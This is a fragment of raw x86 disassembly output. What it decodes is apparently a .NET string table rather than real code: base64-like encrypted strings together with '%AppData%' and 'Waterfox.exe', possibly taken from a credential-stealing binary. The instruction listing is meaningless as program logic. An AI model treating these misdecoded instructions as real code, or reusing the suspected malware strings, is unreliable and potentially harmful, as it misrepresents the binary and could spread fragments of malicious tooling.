  409b56:	68 00 57 00 49       	push   $0x49005700
  409b5b:	00 31                	add    %dh,(%ecx)
  409b5d:	00 2f                	add    %ch,(%edi)
  409b5f:	00 52 00             	add    %dl,0x0(%edx)
  409b62:	4b                   	dec    %ebx
  409b63:	00 30                	add    %dh,(%eax)
  409b65:	00 79 00             	add    %bh,0x0(%ecx)
  409b68:	34 00                	xor    $0x0,%al
  409b6a:	47                   	inc    %edi
  409b6b:	00 39                	add    %bh,(%ecx)
  409b6d:	00 59 00             	add    %bl,0x0(%ecx)
  409b70:	34 00                	xor    $0x0,%al
  409b72:	6b 00 44             	imul   $0x44,(%eax),%eax
  409b75:	00 35 00 2f 00 46    	add    %dh,0x46002f00
  409b7b:	00 4d 00             	add    %cl,0x0(%ebp)
  409b7e:	45                   	inc    %ebp
  409b7f:	00 78 00             	add    %bh,0x0(%eax)
  409b82:	79 00                	jns    0x409b84
  409b84:	59                   	pop    %ecx
  409b85:	00 61 00             	add    %ah,0x0(%ecx)
  409b88:	51                   	push   %ecx
  409b89:	00 66 00             	add    %ah,0x0(%esi)
  409b8c:	76 00                	jbe    0x409b8e
  409b8e:	33 00                	xor    (%eax),%eax
  409b90:	68 00 6d 00 6f       	push   $0x6f006d00
  409b95:	00 32                	add    %dh,(%edx)
  409b97:	00 58 00             	add    %bl,0x0(%eax)
  409b9a:	74 00                	je     0x409b9c
  409b9c:	6e                   	outsb  %ds:(%esi),(%dx)
  409b9d:	00 71 00             	add    %dh,0x0(%ecx)
  409ba0:	69 00 4f 00 42 00    	imul   $0x42004f,(%eax),%eax
  409ba6:	34 00                	xor    $0x0,%al
  409ba8:	67 00 3d             	add    %bh,(%di)
  409bab:	00 3d 00 00 13 25    	add    %bh,0x25130000
  409bb1:	00 41 00             	add    %al,0x0(%ecx)
  409bb4:	70 00                	jo     0x409bb6
  409bb6:	70 00                	jo     0x409bb8
  409bb8:	44                   	inc    %esp
  409bb9:	00 61 00             	add    %ah,0x0(%ecx)
  409bbc:	74 00                	je     0x409bbe
  409bbe:	61                   	popa
  409bbf:	00 25 00 00 19 57    	add    %ah,0x57190000
  409bc5:	00 61 00             	add    %ah,0x0(%ecx)
  409bc8:	74 00                	je     0x409bca
  409bca:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409bce:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  409bd2:	78 00                	js     0x409bd4
  409bd4:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409bd8:	78 00                	js     0x409bda
  409bda:	65 00 00             	add    %al,%gs:(%eax)
  409bdd:	59                   	pop    %ecx
  409bde:	4d                   	dec    %ebp
  409bdf:	00 6d 00             	add    %ch,0x0(%ebp)
  409be2:	77 00                	ja     0x409be4
  409be4:	78 00                	js     0x409be6
  409be6:	4f                   	dec    %edi
  409be7:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  409beb:	00 4a 00             	add    %cl,0x0(%edx)
  409bee:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  409bf2:	52                   	push   %edx
  409bf3:	00 4d 00             	add    %cl,0x0(%ebp)
  409bf6:	61                   	popa
  409bf7:	00 57 00             	add    %dl,0x0(%edi)
  409bfa:	78 00                	js     0x409bfc
  409bfc:	4d                   	dec    %ebp
  409bfd:	00 63 00             	add    %ah,0x0(%ebx)
  409c00:	32 00                	xor    (%eax),%al
  409c02:	30 00                	xor    %al,(%eax)
  409c04:	30 00                	xor    %al,(%eax)
  409c06:	5a                   	pop    %edx
  409c07:	00 6b 00             	add    %ch,0x0(%ebx)
  409c0a:	70 00                	jo     0x409c0c
  409c0c:	6c                   	insb   (%dx),%es:(%edi)
  409c0d:	00 4e 00             	add    %cl,0x0(%esi)
  409c10:	32 00                	xor    (%eax),%al
  409c12:	45                   	inc    %ebp
  409c13:	00 78 00             	add    %bh,0x0(%eax)
  409c16:	64 00 31             	add    %dh,%fs:(%ecx)
  409c19:	00 67 00             	add    %ah,0x0(%edi)
  409c1c:	7a 00                	jp     0x409c1e
  409c1e:	57                   	push   %edi
  409c1f:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  409c23:	00 77 00             	add    %dh,0x0(%edi)
  409c26:	4e                   	dec    %esi
  409c27:	00 57 00             	add    %dl,0x0(%edi)
  409c2a:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  409c2e:	5a                   	pop    %edx
  409c2f:	00 6b 00             	add    %ch,0x0(%ebx)
  409c32:	77 00                	ja     0x409c34
  409c34:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  409c39:	72 00                	jb     0x409c3b
  409c3b:	63 00                	arpl   %eax,(%eax)
  409c3d:	4e                   	dec    %esi
  409c3e:	00 72 00             	add    %dh,0x0(%edx)
  409c41:	2f                   	das
  409c42:	00 47 00             	add    %al,0x0(%edi)
  409c45:	6e                   	outsb  %ds:(%esi),(%dx)
  409c46:	00 61 00             	add    %ah,0x0(%ecx)
  409c49:	76 00                	jbe    0x409c4b
  409c4b:	74 00                	je     0x409c4d
  409c4d:	32 00                	xor    (%eax),%al
  409c4f:	69 00 52 00 62 00    	imul   $0x620052,(%eax),%eax
  409c55:	7a 00                	jp     0x409c57
  409c57:	76 00                	jbe    0x409c59
  409c59:	45                   	inc    %ebp
  409c5a:	00 33                	add    %dh,(%ebx)
  409c5c:	00 73 00             	add    %dh,0x0(%ebx)
  409c5f:	44                   	inc    %esp
  409c60:	00 69 00             	add    %ch,0x0(%ecx)
  409c63:	34 00                	xor    $0x0,%al
  409c65:	6f                   	outsl  %ds:(%esi),(%dx)
  409c66:	00 46 00             	add    %al,0x0(%esi)
  409c69:	48                   	dec    %eax
  409c6a:	00 4a 00             	add    %cl,0x0(%edx)
  409c6d:	35 00 2f 00 4c       	xor    $0x4c002f00,%eax
  409c72:	00 4e 00             	add    %cl,0x0(%esi)
  409c75:	50                   	push   %eax
  409c76:	00 5a 00             	add    %bl,0x0(%edx)
  409c79:	74 00                	je     0x409c7b
  409c7b:	4d                   	dec    %ebp
  409c7c:	00 33                	add    %dh,(%ebx)
  409c7e:	00 32                	add    %dh,(%edx)
  409c80:	00 5a 00             	add    %bl,0x0(%edx)
  409c83:	41                   	inc    %ecx
  409c84:	00 42 00             	add    %al,0x0(%edx)
  409c87:	67 00 4c 00          	add    %cl,0x0(%si)
  409c8b:	6d                   	insl   (%dx),%es:(%edi)
  409c8c:	00 36                	add    %dh,(%esi)
  409c8e:	00 65 00             	add    %ah,0x0(%ebp)
  409c91:	6e                   	outsb  %ds:(%esi),(%dx)
  409c92:	00 50 00             	add    %dl,0x0(%eax)
  409c95:	42                   	inc    %edx
  409c96:	00 45 00             	add    %al,0x0(%ebp)
  409c99:	73 00                	jae    0x409c9b
  409c9b:	4e                   	dec    %esi
  409c9c:	00 61 00             	add    %ah,0x0(%ecx)
  409c9f:	63 00                	arpl   %eax,(%eax)
  409ca1:	5a                   	pop    %edx
  409ca2:	00 49 00             	add    %cl,0x0(%ecx)
  409ca5:	45                   	inc    %ebp
  409ca6:	00 6e 00             	add    %ch,0x0(%esi)
  409ca9:	4e                   	dec    %esi
  409caa:	00 73 00             	add    %dh,0x0(%ebx)
  409cad:	6d                   	insl   (%dx),%es:(%edi)
  409cae:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  409cb2:	00 41 00             	add    %al,0x0(%ecx)
  409cb5:	78 00                	js     0x409cb7
  409cb7:	53                   	push   %ebx
  409cb8:	00 68 00             	add    %ch,0x0(%eax)
  409cbb:	53                   	push   %ebx
  409cbc:	00 4e 00             	add    %cl,0x0(%esi)
  409cbf:	68 00 48 00 46       	push   $0x46004800
  409cc4:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  409cc8:	00 57 00             	add    %dl,0x0(%edi)
  409ccb:	41                   	inc    %ecx
  409ccc:	00 6d 00             	add    %ch,0x0(%ebp)
  409ccf:	52                   	push   %edx
  409cd0:	00 69 00             	add    %ch,0x0(%ecx)
  409cd3:	42                   	inc    %edx
  409cd4:	00 59 00             	add    %bl,0x0(%ecx)
  409cd7:	4f                   	dec    %edi
  409cd8:	00 31                	add    %dh,(%ecx)
  409cda:	00 76 00             	add    %dh,0x0(%esi)
  409cdd:	6a 00                	push   $0x0
  409cdf:	6d                   	insl   (%dx),%es:(%edi)
  409ce0:	00 65 00             	add    %ah,0x0(%ebp)
  409ce3:	77 00                	ja     0x409ce5
  409ce5:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409cea:	92                   	xchg   %eax,%edx
  409ceb:	01 6f 00             	add    %ebp,0x0(%edi)
  409cee:	33 00                	xor    (%eax),%eax
  409cf0:	64 00 33             	add    %dh,%fs:(%ebx)
  409cf3:	00 36                	add    %dh,(%esi)
  409cf5:	00 61 00             	add    %ah,0x0(%ecx)
  409cf8:	69 00 45 00 5a 00    	imul   $0x5a0045,(%eax),%eax
  409cfe:	45                   	inc    %ebp
  409cff:	00 2b                	add    %ch,(%ebx)
  409d01:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  409d05:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d08:	41                   	inc    %ecx
  409d09:	00 31                	add    %dh,(%ecx)
  409d0b:	00 38                	add    %bh,(%eax)
  409d0d:	00 4a 00             	add    %cl,0x0(%edx)
  409d10:	47                   	inc    %edi
  409d11:	00 2f                	add    %ch,(%edi)
  409d13:	00 47 00             	add    %al,0x0(%edi)
  409d16:	77 00                	ja     0x409d18
  409d18:	4b                   	dec    %ebx
  409d19:	00 66 00             	add    %ah,0x0(%esi)
  409d1c:	75 00                	jne    0x409d1e
  409d1e:	42                   	inc    %edx
  409d1f:	00 45 00             	add    %al,0x0(%ebp)
  409d22:	76 00                	jbe    0x409d24
  409d24:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  409d28:	4e                   	dec    %esi
  409d29:	00 42 00             	add    %al,0x0(%edx)
  409d2c:	6c                   	insb   (%dx),%es:(%edi)
  409d2d:	00 48 00             	add    %cl,0x0(%eax)
  409d30:	67 00 4e 00          	add    %cl,0x0(%bp)
  409d34:	47                   	inc    %edi
  409d35:	00 66 00             	add    %ah,0x0(%esi)
  409d38:	41                   	inc    %ecx
  409d39:	00 72 00             	add    %dh,0x0(%edx)
  409d3c:	4a                   	dec    %edx
  409d3d:	00 30                	add    %dh,(%eax)
  409d3f:	00 71 00             	add    %dh,0x0(%ecx)
  409d42:	71 00                	jno    0x409d44
  409d44:	61                   	popa
  409d45:	00 58 00             	add    %bl,0x0(%eax)
  409d48:	34 00                	xor    $0x0,%al
  409d4a:	46                   	inc    %esi
  409d4b:	00 53 00             	add    %dl,0x0(%ebx)
  409d4e:	69 00 69 00 79 00    	imul   $0x790069,(%eax),%eax
  409d54:	58                   	pop    %eax
  409d55:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  409d59:	00 38                	add    %bh,(%eax)
  409d5b:	00 78 00             	add    %bh,0x0(%eax)
  409d5e:	6e                   	outsb  %ds:(%esi),(%dx)
  409d5f:	00 37                	add    %dh,(%edi)
  409d61:	00 4e 00             	add    %cl,0x0(%esi)
  409d64:	45                   	inc    %ebp
  409d65:	00 43 00             	add    %al,0x0(%ebx)
  409d68:	71 00                	jno    0x409d6a
  409d6a:	54                   	push   %esp
  409d6b:	00 6e 00             	add    %ch,0x0(%esi)
  409d6e:	38 00                	cmp    %al,(%eax)
  409d70:	4b                   	dec    %ebx
  409d71:	00 30                	add    %dh,(%eax)
  409d73:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  409d77:	00 78 00             	add    %bh,0x0(%eax)
  409d7a:	70 00                	jo     0x409d7c
  409d7c:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  409d7f:	00 51 00             	add    %dl,0x0(%ecx)
  409d82:	58                   	pop    %eax
  409d83:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  409d87:	00 6a 00             	add    %ch,0x0(%edx)
  409d8a:	31 00                	xor    %eax,(%eax)
  409d8c:	4a                   	dec    %edx
  409d8d:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  409d91:	00 64 00 71          	add    %ah,0x71(%eax,%eax,1)
  409d95:	00 6f 00             	add    %ch,0x0(%edi)
  409d98:	38 00                	cmp    %al,(%eax)
  409d9a:	72 00                	jb     0x409d9c
  409d9c:	39 00                	cmp    %eax,(%eax)
  409d9e:	55                   	push   %ebp
  409d9f:	00 41 00             	add    %al,0x0(%ecx)
  409da2:	5a                   	pop    %edx
  409da3:	00 4d 00             	add    %cl,0x0(%ebp)
  409da6:	38 00                	cmp    %al,(%eax)
  409da8:	52                   	push   %edx
  409da9:	00 32                	add    %dh,(%edx)
  409dab:	00 66 00             	add    %ah,0x0(%esi)
  409dae:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  409db2:	47                   	inc    %edi
  409db3:	00 39                	add    %bh,(%ecx)
  409db5:	00 6f 00             	add    %ch,0x0(%edi)
  409db8:	66 00 46 00          	data16 add %al,0x0(%esi)
  409dbc:	49                   	dec    %ecx
  409dbd:	00 47 00             	add    %al,0x0(%edi)
  409dc0:	54                   	push   %esp
  409dc1:	00 71 00             	add    %dh,0x0(%ecx)
  409dc4:	34 00                	xor    $0x0,%al
  409dc6:	78 00                	js     0x409dc8
  409dc8:	30 00                	xor    %al,(%eax)
  409dca:	76 00                	jbe    0x409dcc
  409dcc:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  409dd0:	31 00                	xor    %eax,(%eax)
  409dd2:	77 00                	ja     0x409dd4
  409dd4:	78 00                	js     0x409dd6
  409dd6:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  409dd9:	00 43 00             	add    %al,0x0(%ebx)
  409ddc:	56                   	push   %esi
  409ddd:	00 4b 00             	add    %cl,0x0(%ebx)
  409de0:	6e                   	outsb  %ds:(%esi),(%dx)
  409de1:	00 37                	add    %dh,(%edi)
  409de3:	00 79 00             	add    %bh,0x0(%ecx)
  409de6:	43                   	inc    %ebx
  409de7:	00 77 00             	add    %dh,0x0(%edi)
  409dea:	39 00                	cmp    %eax,(%eax)
  409dec:	35 00 48 00 4b       	xor    $0x4b004800,%eax
  409df1:	00 30                	add    %dh,(%eax)
  409df3:	00 6d 00             	add    %ch,0x0(%ebp)
  409df6:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  409dfa:	4a                   	dec    %edx
  409dfb:	00 5a 00             	add    %bl,0x0(%edx)
  409dfe:	46                   	inc    %esi
  409dff:	00 45 00             	add    %al,0x0(%ebp)
  409e02:	75 00                	jne    0x409e04
  409e04:	7a 00                	jp     0x409e06
  409e06:	5a                   	pop    %edx
  409e07:	00 61 00             	add    %ah,0x0(%ecx)
  409e0a:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  409e0e:	48                   	dec    %eax
  409e0f:	00 39                	add    %bh,(%ecx)
  409e11:	00 2f                	add    %ch,(%edi)
  409e13:	00 71 00             	add    %dh,0x0(%ecx)
  409e16:	6d                   	insl   (%dx),%es:(%edi)
  409e17:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e1a:	56                   	push   %esi
  409e1b:	00 6b 00             	add    %ch,0x0(%ebx)
  409e1e:	37                   	aaa
  409e1f:	00 53 00             	add    %dl,0x0(%ebx)
  409e22:	56                   	push   %esi
  409e23:	00 37                	add    %dh,(%edi)
  409e25:	00 58 00             	add    %bl,0x0(%eax)
  409e28:	62 00                	bound  %eax,(%eax)
  409e2a:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  409e2e:	48                   	dec    %eax
  409e2f:	00 70 00             	add    %dh,0x0(%eax)
  409e32:	63 00                	arpl   %eax,(%eax)
  409e34:	66 00 52 00          	data16 add %dl,0x0(%edx)
  409e38:	39 00                	cmp    %eax,(%eax)
  409e3a:	38 00                	cmp    %al,(%eax)
  409e3c:	37                   	aaa
  409e3d:	00 7a 00             	add    %bh,0x0(%edx)
  409e40:	52                   	push   %edx
  409e41:	00 30                	add    %dh,(%eax)
  409e43:	00 63 00             	add    %ah,0x0(%ebx)
  409e46:	41                   	inc    %ecx
  409e47:	00 31                	add    %dh,(%ecx)
  409e49:	00 78 00             	add    %bh,0x0(%eax)
  409e4c:	53                   	push   %ebx
  409e4d:	00 77 00             	add    %dh,0x0(%edi)
  409e50:	7a 00                	jp     0x409e52
  409e52:	4c                   	dec    %esp
  409e53:	00 6b 00             	add    %ch,0x0(%ebx)
  409e56:	4e                   	dec    %esi
  409e57:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e5a:	32 00                	xor    (%eax),%al
  409e5c:	79 00                	jns    0x409e5e
  409e5e:	75 00                	jne    0x409e60
  409e60:	58                   	pop    %eax
  409e61:	00 48 00             	add    %cl,0x0(%eax)
  409e64:	55                   	push   %ebp
  409e65:	00 75 00             	add    %dh,0x0(%ebp)
  409e68:	30 00                	xor    %al,(%eax)
  409e6a:	53                   	push   %ebx
  409e6b:	00 49 00             	add    %cl,0x0(%ecx)
  409e6e:	77 00                	ja     0x409e70
  409e70:	74 00                	je     0x409e72
  409e72:	61                   	popa
  409e73:	00 38                	add    %bh,(%eax)
  409e75:	00 70 00             	add    %dh,0x0(%eax)
  409e78:	71 00                	jno    0x409e7a
  409e7a:	7a 00                	jp     0x409e7c
  409e7c:	50                   	push   %eax
  409e7d:	00 69 00             	add    %ch,0x0(%ecx)
  409e80:	47                   	inc    %edi
  409e81:	00 42 00             	add    %al,0x0(%edx)
  409e84:	48                   	dec    %eax
  409e85:	00 63 00             	add    %ah,0x0(%ebx)
  409e88:	71 00                	jno    0x409e8a
  409e8a:	56                   	push   %esi
  409e8b:	00 77 00             	add    %dh,0x0(%edi)
  409e8e:	52                   	push   %edx
  409e8f:	00 4f 00             	add    %cl,0x0(%edi)
  409e92:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  409e96:	5a                   	pop    %edx
  409e97:	00 6a 00             	add    %ch,0x0(%edx)
  409e9a:	45                   	inc    %ebp
  409e9b:	00 50 00             	add    %dl,0x0(%eax)
  409e9e:	4a                   	dec    %edx
  409e9f:	00 78 00             	add    %bh,0x0(%eax)
  409ea2:	71 00                	jno    0x409ea4
  409ea4:	55                   	push   %ebp
  409ea5:	00 46 00             	add    %al,0x0(%esi)
  409ea8:	61                   	popa
  409ea9:	00 6f 00             	add    %ch,0x0(%edi)
  409eac:	37                   	aaa
  409ead:	00 4f 00             	add    %cl,0x0(%edi)
  409eb0:	77 00                	ja     0x409eb2
  409eb2:	63 00                	arpl   %eax,(%eax)
  409eb4:	6c                   	insb   (%dx),%es:(%edi)
  409eb5:	00 50 00             	add    %dl,0x0(%eax)
  409eb8:	4a                   	dec    %edx
  409eb9:	00 77 00             	add    %dh,0x0(%edi)
  409ebc:	44                   	inc    %esp
  409ebd:	00 6d 00             	add    %ch,0x0(%ebp)
  409ec0:	71 00                	jno    0x409ec2
  409ec2:	66 00 36             	data16 add %dh,(%esi)
  409ec5:	00 36                	add    %dh,(%esi)
  409ec7:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  409ecb:	00 5a 00             	add    %bl,0x0(%edx)
  409ece:	4b                   	dec    %ebx
  409ecf:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  409ed3:	00 6d 00             	add    %ch,0x0(%ebp)
  409ed6:	61                   	popa
  409ed7:	00 34 00             	add    %dh,(%eax,%eax,1)
  409eda:	33 00                	xor    (%eax),%eax
  409edc:	76 00                	jbe    0x409ede
  409ede:	4e                   	dec    %esi
  409edf:	00 4d 00             	add    %cl,0x0(%ebp)
  409ee2:	79 00                	jns    0x409ee4
  409ee4:	68 00 71 00 73       	push   $0x73007100
  409ee9:	00 2f                	add    %ch,(%edi)
  409eeb:	00 30                	add    %dh,(%eax)
  409eed:	00 38                	add    %bh,(%eax)
  409eef:	00 41 00             	add    %al,0x0(%ecx)
  409ef2:	4d                   	dec    %ebp
  409ef3:	00 35 00 4a 00 64    	add    %dh,0x64004a00
  409ef9:	00 73 00             	add    %dh,0x0(%ebx)
  409efc:	6b 00 79             	imul   $0x79,(%eax),%eax
  409eff:	00 38                	add    %bh,(%eax)
  409f01:	00 69 00             	add    %ch,0x0(%ecx)
  409f04:	68 00 4f 00 31       	push   $0x31004f00
  409f09:	00 75 00             	add    %dh,0x0(%ebp)
  409f0c:	73 00                	jae    0x409f0e
  409f0e:	49                   	dec    %ecx
  409f0f:	00 35 00 6b 00 61    	add    %dh,0x61006b00
  409f15:	00 47 00             	add    %al,0x0(%edi)
  409f18:	75 00                	jne    0x409f1a
  409f1a:	30 00                	xor    %al,(%eax)
  409f1c:	43                   	inc    %ebx
  409f1d:	00 38                	add    %bh,(%eax)
  409f1f:	00 2b                	add    %ch,(%ebx)
  409f21:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f24:	4e                   	dec    %esi
  409f25:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  409f29:	00 49 00             	add    %cl,0x0(%ecx)
  409f2c:	72 00                	jb     0x409f2e
  409f2e:	38 00                	cmp    %al,(%eax)
  409f30:	4e                   	dec    %esi
  409f31:	00 63 00             	add    %ah,0x0(%ebx)
  409f34:	45                   	inc    %ebp
  409f35:	00 63 00             	add    %ah,0x0(%ebx)
  409f38:	63 00                	arpl   %eax,(%eax)
  409f3a:	43                   	inc    %ebx
  409f3b:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  409f3f:	00 67 00             	add    %ah,0x0(%edi)
  409f42:	71 00                	jno    0x409f44
  409f44:	35 00 66 00 6e       	xor    $0x6e006600,%eax
  409f49:	00 56 00             	add    %dl,0x0(%esi)
  409f4c:	76 00                	jbe    0x409f4e
  409f4e:	58                   	pop    %eax
  409f4f:	00 75 00             	add    %dh,0x0(%ebp)
  409f52:	71 00                	jno    0x409f54
  409f54:	6e                   	outsb  %ds:(%esi),(%dx)
  409f55:	00 62 00             	add    %ah,0x0(%edx)
  409f58:	6b 00 53             	imul   $0x53,(%eax),%eax
  409f5b:	00 50 00             	add    %dl,0x0(%eax)
  409f5e:	6e                   	outsb  %ds:(%esi),(%dx)
  409f5f:	00 6a 00             	add    %ch,0x0(%edx)
  409f62:	58                   	pop    %eax
  409f63:	00 50 00             	add    %dl,0x0(%eax)
  409f66:	62 00                	bound  %eax,(%eax)
  409f68:	68 00 49 00 36       	push   $0x36004900
  409f6d:	00 42 00             	add    %al,0x0(%edx)
  409f70:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  409f74:	5a                   	pop    %edx
  409f75:	00 7a 00             	add    %bh,0x0(%edx)
  409f78:	32 00                	xor    (%eax),%al
  409f7a:	6f                   	outsl  %ds:(%esi),(%dx)
  409f7b:	00 72 00             	add    %dh,0x0(%edx)
  409f7e:	32 00                	xor    (%eax),%al
  409f80:	53                   	push   %ebx
  409f81:	00 39                	add    %bh,(%ecx)
  409f83:	00 6f 00             	add    %ch,0x0(%edi)
  409f86:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  409f8a:	76 00                	jbe    0x409f8c
  409f8c:	58                   	pop    %eax
  409f8d:	00 43 00             	add    %al,0x0(%ebx)
  409f90:	37                   	aaa
  409f91:	00 53 00             	add    %dl,0x0(%ebx)
  409f94:	70 00                	jo     0x409f96
  409f96:	45                   	inc    %ebp
  409f97:	00 33                	add    %dh,(%ebx)
  409f99:	00 6d 00             	add    %ch,0x0(%ebp)
  409f9c:	63 00                	arpl   %eax,(%eax)
  409f9e:	67 00 6d 00          	add    %ch,0x0(%di)
  409fa2:	6d                   	insl   (%dx),%es:(%edi)
  409fa3:	00 71 00             	add    %dh,0x0(%ecx)
  409fa6:	6c                   	insb   (%dx),%es:(%edi)
  409fa7:	00 6d 00             	add    %ch,0x0(%ebp)
  409faa:	76 00                	jbe    0x409fac
  409fac:	70 00                	jo     0x409fae
  409fae:	74 00                	je     0x409fb0
  409fb0:	48                   	dec    %eax
  409fb1:	00 33                	add    %dh,(%ebx)
  409fb3:	00 45 00             	add    %al,0x0(%ebp)
  409fb6:	58                   	pop    %eax
  409fb7:	00 43 00             	add    %al,0x0(%ebx)
  409fba:	72 00                	jb     0x409fbc
  409fbc:	5a                   	pop    %edx
  409fbd:	00 47 00             	add    %al,0x0(%edi)
  409fc0:	6d                   	insl   (%dx),%es:(%edi)
  409fc1:	00 72 00             	add    %dh,0x0(%edx)
  409fc4:	6e                   	outsb  %ds:(%esi),(%dx)
  409fc5:	00 2f                	add    %ch,(%edi)
  409fc7:	00 79 00             	add    %bh,0x0(%ecx)
  409fca:	73 00                	jae    0x409fcc
  409fcc:	4b                   	dec    %ebx
  409fcd:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  409fd1:	00 55 00             	add    %dl,0x0(%ebp)
  409fd4:	74 00                	je     0x409fd6
  409fd6:	74 00                	je     0x409fd8
  409fd8:	58                   	pop    %eax
  409fd9:	00 42 00             	add    %al,0x0(%edx)
  409fdc:	38 00                	cmp    %al,(%eax)
  409fde:	2f                   	das
  409fdf:	00 4a 00             	add    %cl,0x0(%edx)
  409fe2:	58                   	pop    %eax
  409fe3:	00 51 00             	add    %dl,0x0(%ecx)
  409fe6:	49                   	dec    %ecx
  409fe7:	00 2b                	add    %ch,(%ebx)
  409fe9:	00 4d 00             	add    %cl,0x0(%ebp)
  409fec:	49                   	dec    %ecx
  409fed:	00 53 00             	add    %dl,0x0(%ebx)
  409ff0:	6d                   	insl   (%dx),%es:(%edi)
  409ff1:	00 2f                	add    %ch,(%edi)
  409ff3:	00 70 00             	add    %dh,0x0(%eax)
  409ff6:	74 00                	je     0x409ff8
  409ff8:	6d                   	insl   (%dx),%es:(%edi)
  409ff9:	00 6f 00             	add    %ch,0x0(%edi)
  409ffc:	54                   	push   %esp
  409ffd:	00 4d 00             	add    %cl,0x0(%ebp)
  40a000:	47                   	inc    %edi
  40a001:	00 73 00             	add    %dh,0x0(%ebx)
  40a004:	52                   	push   %edx
  40a005:	00 67 00             	add    %ah,0x0(%edi)
  40a008:	2f                   	das
  40a009:	00 61 00             	add    %ah,0x0(%ecx)
  40a00c:	41                   	inc    %ecx
  40a00d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a010:	43                   	inc    %ebx
  40a011:	00 48 00             	add    %cl,0x0(%eax)
  40a014:	62 00                	bound  %eax,(%eax)
  40a016:	57                   	push   %edi
  40a017:	00 56 00             	add    %dl,0x0(%esi)
  40a01a:	4d                   	dec    %ebp
  40a01b:	00 38                	add    %bh,(%eax)
  40a01d:	00 49 00             	add    %cl,0x0(%ecx)
  40a020:	73 00                	jae    0x40a022
  40a022:	69 00 4d 00 72 00    	imul   $0x72004d,(%eax),%eax
  40a028:	45                   	inc    %ebp
  40a029:	00 2f                	add    %ch,(%edi)
  40a02b:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40a02f:	00 62 00             	add    %ah,0x0(%edx)
  40a032:	53                   	push   %ebx
  40a033:	00 6e 00             	add    %ch,0x0(%esi)
  40a036:	2f                   	das
  40a037:	00 6d 00             	add    %ch,0x0(%ebp)
  40a03a:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40a03e:	59                   	pop    %ecx
  40a03f:	00 49 00             	add    %cl,0x0(%ecx)
  40a042:	35 00 32 00 57       	xor    $0x57003200,%eax
  40a047:	00 57 00             	add    %dl,0x0(%edi)
  40a04a:	72 00                	jb     0x40a04c
  40a04c:	76 00                	jbe    0x40a04e
  40a04e:	7a 00                	jp     0x40a050
  40a050:	61                   	popa
  40a051:	00 73 00             	add    %dh,0x0(%ebx)
  40a054:	4b                   	dec    %ebx
  40a055:	00 70 00             	add    %dh,0x0(%eax)
  40a058:	4f                   	dec    %edi
  40a059:	00 42 00             	add    %al,0x0(%edx)
  40a05c:	54                   	push   %esp
  40a05d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a060:	47                   	inc    %edi
  40a061:	00 62 00             	add    %ah,0x0(%edx)
  40a064:	50                   	push   %eax
  40a065:	00 45 00             	add    %al,0x0(%ebp)
  40a068:	38 00                	cmp    %al,(%eax)
  40a06a:	63 00                	arpl   %eax,(%eax)
  40a06c:	44                   	inc    %esp
  40a06d:	00 4e 00             	add    %cl,0x0(%esi)
  40a070:	6a 00                	push   $0x0
  40a072:	62 00                	bound  %eax,(%eax)
  40a074:	78 00                	js     0x40a076
  40a076:	6d                   	insl   (%dx),%es:(%edi)
  40a077:	00 5a 00             	add    %bl,0x0(%edx)
  40a07a:	44                   	inc    %esp
  40a07b:	00 73 00             	add    %dh,0x0(%ebx)
  40a07e:	75 00                	jne    0x40a080
  40a080:	43                   	inc    %ebx
  40a081:	00 7a 00             	add    %bh,0x0(%edx)
  40a084:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40a088:	30 00                	xor    %al,(%eax)
  40a08a:	57                   	push   %edi
  40a08b:	00 6a 00             	add    %ch,0x0(%edx)
  40a08e:	68 00 34 00 52       	push   $0x52003400
  40a093:	00 58 00             	add    %bl,0x0(%eax)
  40a096:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40a09a:	61                   	popa
  40a09b:	00 41 00             	add    %al,0x0(%ecx)
  40a09e:	6b 00 62             	imul   $0x62,(%eax),%eax
  40a0a1:	00 48 00             	add    %cl,0x0(%eax)
  40a0a4:	45                   	inc    %ebp
  40a0a5:	00 37                	add    %dh,(%edi)
  40a0a7:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  40a0ab:	00 4e 00             	add    %cl,0x0(%esi)
  40a0ae:	4a                   	dec    %edx
  40a0af:	00 62 00             	add    %ah,0x0(%edx)
  40a0b2:	46                   	inc    %esi
  40a0b3:	00 48 00             	add    %cl,0x0(%eax)
  40a0b6:	34 00                	xor    $0x0,%al
  40a0b8:	48                   	dec    %eax
  40a0b9:	00 41 00             	add    %al,0x0(%ecx)
